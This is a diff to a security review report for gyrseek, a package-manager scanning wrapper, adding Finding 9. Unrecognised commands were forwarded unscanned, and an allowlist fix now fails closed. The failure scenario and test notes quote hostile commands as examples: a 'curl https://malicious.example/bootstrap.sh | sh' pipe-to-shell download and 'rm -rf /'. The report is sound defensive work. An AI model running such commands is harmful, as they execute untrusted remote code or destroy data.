@@ -44,6 +44,24 @@ Method: 7-angle static review (line-by-line, removed-behavior, cross-file, reuse
 | 7         | Unit test `pins_extras_spec_using_canonical_key_and_preserves_extras` — `requests[security]==2.31.0` pinned correctly from `pins["requests"]`.                                     | `1 passed`                               |
 | 8         | `./target/debug/gyrseek pip install requests` (no host pip) → exit 1. `./target/debug/gyrseek true` → exit 0. `forwarding_propagates_host_nonzero_exit_status` test passes.        | `exit: 1` / `exit: 0`                    |
 | follow-on | Unit test `docker_args_grant_sys_ptrace_capability` — `--cap-add SYS_PTRACE` present in docker run args.                                                                           | `1 passed`                               |
+| #9        | `./target/debug/gyrseek ls`, `curl`, `rm -rf /tmp/test` — all rejected exit 1 with supported-manager list. `sandbox runtimes` and `npm install lodash` still work. | `exit: 1` / `exit: 0` |
+
+---
+
+## Finding 9 — Medium | `lib.rs` (post-verification, 2026-06-10)
+
+**Summary:** Unrecognized managers were silently forwarded unscanned, violating gyrseek's core contract.
+
+**Root cause:** The `run()` fallback at the bottom of `lib.rs` called `forward_original_command()` for any manager that `should_enforce_package_detection` returned `false` for — which includes every unrecognized command. `gyrseek ls`, `gyrseek curl https://...`, and `gyrseek rm -rf /` all executed unscanned.
+
+**Failure scenario:** A misconfigured CI pipeline has `alias pip=gyrseek`. A developer adds `gyrseek curl https://malicious.example/bootstrap.sh | sh` to a script. gyrseek forwards it silently and exits 0. No scan, no warning, full false assurance.
+
+**Fix:** Upfront allowlist check in `run()` before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` (except `sandbox runtimes`) exits 1 with:
+```
+❌ [gyrseek] Unrecognized manager 'curl'. Supported managers: pip, pip3, uv, poetry, npm. Failing closed.
+```
+
+**✅ Fix status — FIXED.** `SUPPORTED_MANAGERS` allowlist added at `lib.rs:769`. `forward_fail_closed_tests.rs` updated to use a fake `uv` binary (via temp dir on `PATH`) rather than arbitrary commands, so the tests remain valid under the new restriction. Verified at CLI: `ls`, `curl`, `rm` all rejected; `sandbox runtimes` and real scans unaffected.
 
 ---
 
